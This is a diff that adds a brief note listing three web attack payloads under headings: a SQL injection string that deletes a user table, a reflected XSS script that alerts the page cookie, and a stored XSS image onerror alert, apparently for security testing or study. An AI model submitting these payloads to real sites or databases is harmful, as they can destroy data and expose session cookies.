@@ -1,0 +1,13 @@
+
+
+SQL Injection
+
+--> DELETE FROM [user];
+
+Reflected XSS
+
+--> "><script >alert(document.cookie)</script >
+
+Stored XSS 
+
+--> <img src=x onerror="alert('Pop-up window via stored XSS');"
